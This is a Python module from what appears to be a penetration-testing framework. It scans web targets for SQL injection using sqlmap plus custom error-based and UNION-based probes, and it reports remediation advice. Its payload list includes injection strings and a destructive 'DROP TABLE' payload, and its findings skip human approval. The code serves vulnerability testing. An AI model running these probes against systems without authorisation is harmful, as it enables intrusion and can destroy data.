"""
AEGIS-X SQL Injection Scanner
Algorithm: Error-based, UNION-based, stacked queries detection.
Tools: sqlmap --level 3 --risk 2 (primary), custom error-based detection (fallback)
"""
import json
from aegisx.core import http_client as requests
from typing import Dict, Any, List
from urllib.parse import urlparse, parse_qs, urlencode

from aegisx.core.orchestration.command_gateway import CommandGateway
from aegisx.core.ui.console import ConsoleUI


class SQLInjectionScanner:

    ERROR_PAYLOADS = ["'", "\"", "1 OR 1=1", "1' OR '1'='1", "1; DROP TABLE test--",
                      "1 UNION SELECT NULL--", "') OR ('1'='1"]

    SQL_ERROR_MARKERS = [
        "sql syntax", "mysql_fetch", "you have an error in your sql",
        "unclosed quotation", "pg_query", "sqlite3.operationalerror",
        "microsoft ole db", "odbc drivers", "syntax error",
        "ora-01756", "postgresql", "warning: mysql",
    ]

    def scan(self, target: str, routes: List[str]) -> List[Dict[str, Any]]:
        findings = []

        # Run sqlmap comprehensive scan
        sqlmap_findings = self._run_sqlmap(target, routes)
        findings.extend(sqlmap_findings)

        # Custom error-based detection
        custom_findings = self._error_based_scan(target, routes)
        findings.extend(custom_findings)

        # UNION-based detection
        union_findings = self._union_based_scan(target, routes)
        findings.extend(union_findings)

        return findings

    def _run_sqlmap(self, target: str, routes: List[str]) -> List[Dict[str, Any]]:
        findings = []
        base_url = f"http://{target}"

        # Find parameterized URLs
        param_urls = []
        for r in routes:
            url = f"{base_url}{r}" if r.startswith("/") else r
            if "?" in url or "=" in url:
                param_urls.append(url)

        if not param_urls:
            # Crawl-based scan
            param_urls = [base_url]

        for url in param_urls[:3]:
            cmd = ["sqlmap", "-u", url, "--batch", "--random-agent",
                   "--level", "3", "--risk", "2", "--crawl=2",
                   "--threads", "4", "-v", "0", "--timeout", "10"]

            ConsoleUI.info(f"[SQLi] Running sqlmap (level 3, risk 2): {url}")
            result = CommandGateway.execute(cmd, timeout=300, description="SQL Injection Deep Scan (SQLMap)")

            stdout = result.get("stdout", "") or ""
            if "is vulnerable" in stdout or "identified the following injection" in stdout:
                findings.append({
                    "finding_type": "SQL Injection - SQLMap Confirmed",
                    "base_confidence": 0.99, "consensus_score": 0.99, "score_conflict": False,
                    "risk_level": "CRITICAL", "governance_class": "ACTIVE_VALIDATION",
                    "requires_human_approval": False,
                    "recommended_validation": [
                        "Use parameterized queries / prepared statements",
                        "Implement input validation with allowlists",
                        "Use an ORM to abstract database queries",
                        "Apply principle of least privilege to DB accounts",
                    ],
                    "reasoning": [
                        f"SQLMap confirmed SQL injection at: {url}",
                        stdout[:500],
                    ],
                    "nodes": [], "edges": [],
                })

        return findings

    def _error_based_scan(self, target: str, routes: List[str]) -> List[Dict[str, Any]]:
        findings = []
        base_url = f"http://{target}"
        tested = set()

        for route in routes:
            url = f"{base_url}{route}" if route.startswith("/") else route
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                continue
            key = f"{parsed.path}:{','.join(params.keys())}"
            if key in tested:
                continue
            tested.add(key)

            for pname in params:
                for payload in self.ERROR_PAYLOADS:
                    tp = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    tp[pname] = payload
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(tp)}"
                    try:
                        resp = requests.get(test_url, timeout=5)
                        resp_lower = resp.text.lower()
                        for marker in self.SQL_ERROR_MARKERS:
                            if marker in resp_lower:
                                ConsoleUI.success(f"[SQLi] Error-based injection: {pname}")
                                findings.append({
                                    "finding_type": "SQL Injection (Error-Based)",
                                    "base_confidence": 0.90, "consensus_score": 0.90, "score_conflict": False,
                                    "risk_level": "CRITICAL", "governance_class": "ACTIVE_VALIDATION",
                                    "requires_human_approval": False,
                                    "recommended_validation": ["Use parameterized queries"],
                                    "reasoning": [
                                        f"SQL error triggered via '{pname}' with payload: {payload}",
                                        f"Error marker: {marker}",
                                    ],
                                    "nodes": [], "edges": [],
                                })
                                return findings  # One is enough
                    except Exception:
                        pass
        return findings

    def _union_based_scan(self, target: str, routes: List[str]) -> List[Dict[str, Any]]:
        findings = []
        base_url = f"http://{target}"

        for route in routes:
            url = f"{base_url}{route}" if route.startswith("/") else route
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                continue

            for pname in params:
                # Try to determine column count via ORDER BY
                col_count = self._find_column_count(url, pname, params)
                if col_count and col_count > 0:
                    # Try UNION SELECT
                    nulls = ",".join(["NULL"] * col_count)
                    tp = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    tp[pname] = f"1 UNION SELECT {nulls}--"
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(tp)}"
                    try:
                        resp = requests.get(test_url, timeout=5)
                        baseline = requests.get(url, timeout=5)
                        if resp.status_code == 200 and len(resp.text) != len(baseline.text):
                            findings.append({
                                "finding_type": "SQL Injection (UNION-Based)",
                                "base_confidence": 0.88, "consensus_score": 0.88, "score_conflict": False,
                                "risk_level": "CRITICAL", "governance_class": "ACTIVE_VALIDATION",
                                "requires_human_approval": False,
                                "recommended_validation": ["Use parameterized queries"],
                                "reasoning": [
                                    f"UNION injection via '{pname}' with {col_count} columns",
                                ],
                                "nodes": [], "edges": [],
                            })
                            return findings
                    except Exception:
                        pass
        return findings

    def _find_column_count(self, url: str, param: str, params: dict) -> int | None:
        parsed = urlparse(url)
        for n in range(1, 15):
            tp = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            tp[param] = f"1 ORDER BY {n}--"
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(tp)}"
            try:
                resp = requests.get(test_url, timeout=5)
                if resp.status_code != 200 or any(m in resp.text.lower() for m in self.SQL_ERROR_MARKERS):
                    return n - 1 if n > 1 else None
            except Exception:
                return None
        return None
